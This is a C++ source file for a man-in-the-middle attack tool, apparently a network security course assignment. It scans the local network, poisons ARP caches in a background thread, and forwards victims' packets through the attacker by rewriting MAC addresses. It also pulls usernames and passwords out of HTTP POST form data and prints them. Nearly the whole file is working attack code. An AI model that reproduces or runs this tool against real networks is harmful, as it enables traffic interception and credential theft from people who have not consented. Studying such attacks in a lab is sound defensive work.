#include "mitm_attack.hpp"
using namespace std;
std::string get_default_interface() {
    FILE *pipe = popen("ip route | awk '/default/ {print $5}'", "r");
    if (!pipe) {
        std::cerr << "Error: Failed to open pipe for command execution." << std::endl;
        return "";
    }

    char buffer[128];
    std::string result = "";
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }
    pclose(pipe);

    // Trim trailing newline character
    if (!result.empty() && result[result.length() - 1] == '\n') {
        result.erase(result.length() - 1);
    }

    return result;
}
MITM::MITM(char *interface) : Attacker(interface){
}
void MITM::make_device(){
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(interface);
    device.sll_family = AF_PACKET;
    device.sll_protocol = htons(ETH_P_ARP);
    device.sll_halen = htons(6);
    for(int i = 0; i < 6; i++){
        device.sll_addr[i] = attacker_info.src_mac[i];
    }
}

void MITM::modify_packet(array<uint8_t, IP_MAXPACKET> &packet){
    // cout << "Modifying packet..." << endl;
    struct ethhdr *eth_hdr = (struct ethhdr *)packet.data();
    struct iphdr *ip_hdr = (struct iphdr *)(packet.data() + 14);
    
    // Modify the source MAC address
    for(int i = 0; i < 6; i++){
        eth_hdr->h_source[i] = attacker_info.src_mac[i];
    }
    // Modify the destination IP address
    IPAddress dest_ip;
    for(int i = 0; i < 4; i++){
        dest_ip[i] = reinterpret_cast<uint8_t*>(&ip_hdr->daddr)[i];
    }

    if(victims.find(dest_ip) == victims.end()){ // dest_ip is not in the victims map
        // Modify the destination MAC address to the gateway's MAC address
        for(int i = 0; i < 6; i++){
            eth_hdr->h_dest[i] = gateway_mac[i];
        }
    }else{ // dest_ip is in the victims map
        // the 
        if(memcmp(eth_hdr->h_dest, attacker_info.src_mac.data(), 6) != 0 &&
           ip_hdr->daddr != attacker_info.src_ip.sin_addr.s_addr){
            // Modify the destination MAC address to the detination device's MAC address
            for(int i = 0; i < 6; i++){
                eth_hdr->h_dest[i] = victims[dest_ip][i];
            }
        }
    }
}

void MITM::redirect_reply(array<uint8_t, IP_MAXPACKET> &packet, int size){
    uint8_t *payload = packet.data() + 14 + sizeof(struct iphdr) + sizeof(struct tcphdr);
    int payload_length = size - (14 + sizeof(struct iphdr) + sizeof(struct tcphdr));

    int chunk_size = 1024;  // Size of each chunk
    for(int current_offset = 0; current_offset < size; current_offset += chunk_size){
        int current_size = min(size - current_offset, chunk_size);
        if(sendto(sockfd, packet.data() + current_offset, current_size, 0, (struct sockaddr*)&device, sizeof(device)) <= 0){
            perror("sendto() failed to redirect reply");
            exit(1);
        }
    }
}
void MITM::print_username_password(uint8_t *packet, int size){
    // Print the username and password
    string data(reinterpret_cast<char*>(packet), size);
    // cout << "Data: " << data << endl;
    // txtUsername=testfsdfa&txtPassword=tset
    string username = "txtUsername=";
    string password = "txtPassword=";
    size_t username_pos = data.find(username);
    size_t username_end = data.find('&', username_pos);
    size_t password_pos = data.find(password);
    if (username_pos != string::npos && password_pos != string::npos) {
        cout << "Username: " << data.substr(username_pos + username.size(), username_end - username_pos - username.size()) << endl;
        cout << "Password: " << data.substr(password_pos + password.size(), data.find('&', password_pos) - password_pos - password.size()) << endl;
    }
}
void MITM::receive_reply(){
    array<uint8_t, IP_MAXPACKET> packet;
    struct sockaddr saddr;
    int saddr_size = sizeof(saddr);
    int received_bytes;
    while (true) {
        // Receive packet
        received_bytes = recvfrom(sockfd, packet.data(), IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_size);
        if(received_bytes < 0){
            perror("recvfrom() failed to receive ARP reply");
            exit(1);
        }

        // don't process ARP packets or packets that are smaller than 14 bytes (14 bytes is the minimum size of an Ethernet frame)
        if( received_bytes<14 || 
            packet[12] == ETH_P_ARP / 256 && packet[13] == ETH_P_ARP % 256){
            continue;
        }else if (received_bytes < 14 + sizeof(struct iphdr)){
            continue;
        }
        struct iphdr *ip = (struct iphdr *)(packet.data() + 14);
        // 127.0.0.1 is the loopback address
        if(ip->saddr == htonl(0x7f000001) || ip->daddr == htonl(0x7f000001)){
            continue;
        }

        modify_packet(packet);

        
        // Get the payload
        uint8_t *payload = packet.data() + 14 + sizeof(struct iphdr) + sizeof(struct tcphdr);
        int payload_length = received_bytes - (14 + sizeof(struct iphdr) + sizeof(struct tcphdr));

        if (memcmp(payload, "POST", 4) != 0) {
            redirect_reply(packet, received_bytes);
            continue;
        }

        // Print the username and password
        print_username_password(payload, payload_length);

        if (sendto(sockfd, packet.data(), received_bytes, 0, (struct sockaddr *)&device, sizeof(device)) <0) {
            perror("sendto() failed to send modified packet");
            exit(1);
        }
        memset(packet.data(), 0, IP_MAXPACKET);
    }
}
int main(int argc, char **argv){
    if (geteuid() != 0) {
        cerr << "./mitm_attack: Permission denied" << endl;
        cerr << "Try sudo ./mitm_attack" << endl;
        return 1;
    }
    // if(argc != 2){ // Check if the user has provided the interface
    //     cerr << "Usage: " << argv[0] << " <interface>" << endl;
    //     return 1;
    // }
    char *interface = get_default_interface().data();
    cout << "Interface: " << interface << endl;

    MITM mitm(interface);
    mitm.make_device();
    // task 1
    cout << "Scanning the network..." << endl;
    mitm.scan();

    // task 2
    
    // cout << "ARP spoofing..." << endl;
    // pid_t pid = fork();
    // if(pid == 0){
    //     while(true){
    //         mitm.arp_spoof();
    //         this_thread::sleep_for(chrono::seconds(1));
    //     }
    // }
    // else{        
    //     mitm.receive_reply();
    //     kill(pid, SIGKILL);
    // }
    thread arp_spoof_thread(&MITM::arp_spoof, &mitm);
    
    mitm.receive_reply();
    arp_spoof_thread.join();    
    close(mitm.sockfd);
    return 0;
}